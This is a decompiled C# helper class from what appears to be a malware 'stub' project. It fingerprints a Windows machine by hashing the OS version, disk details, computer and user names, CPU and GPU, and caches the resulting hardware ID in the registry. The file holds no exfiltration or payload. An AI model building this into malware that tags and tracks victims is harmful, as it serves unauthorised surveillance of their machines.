using System;
using System.Management;
using System.Security.Cryptography;
using System.Text;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	// Token: 0x0200001D RID: 29
	internal class HwidGen
	{
		// Token: 0x06000071 RID: 113 RVA: 0x00003F68 File Offset: 0x00002168
		public static string hwid()
		{
			if (!SetRegistry.CheckValue("hwid"))
			{
				try
				{
					MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
					byte[] array = Encoding.ASCII.GetBytes(string.Concat(new string[]
					{
						Settings.WindowsVersion,
						HwidGen.diskId(),
						Settings.Computer,
						Environment.ProcessorCount.ToString(),
						Settings.UserName,
						Settings.Cpu,
						Settings.Gpu
					}));
					array = md5CryptoServiceProvider.ComputeHash(array);
					StringBuilder stringBuilder = new StringBuilder();
					foreach (byte b in array)
					{
						stringBuilder.Append(b.ToString("x2"));
					}
					string text = stringBuilder.ToString().Substring(0, 23).ToUpper();
					SetRegistry.SetValue("hwid", text);
					return text;
				}
				catch
				{
					return "Error";
				}
			}
			return SetRegistry.GetValueStr("hwid");
		}

		// Token: 0x06000072 RID: 114 RVA: 0x00004084 File Offset: 0x00002284
		private static string identifier(string wmiClass, string wmiProperty)
		{
			string text = "";
			foreach (ManagementBaseObject managementBaseObject in new ManagementClass(wmiClass).GetInstances())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				if (text == "")
				{
					try
					{
						text = managementObject[wmiProperty].ToString();
						break;
					}
					catch
					{
					}
				}
			}
			return text;
		}

		// Token: 0x06000073 RID: 115 RVA: 0x00004108 File Offset: 0x00002308
		private static string diskId()
		{
			return HwidGen.identifier("Win32_DiskDrive", "Model") + HwidGen.identifier("Win32_DiskDrive", "Manufacturer") + HwidGen.identifier("Win32_DiskDrive", "Name");
		}
	}
}
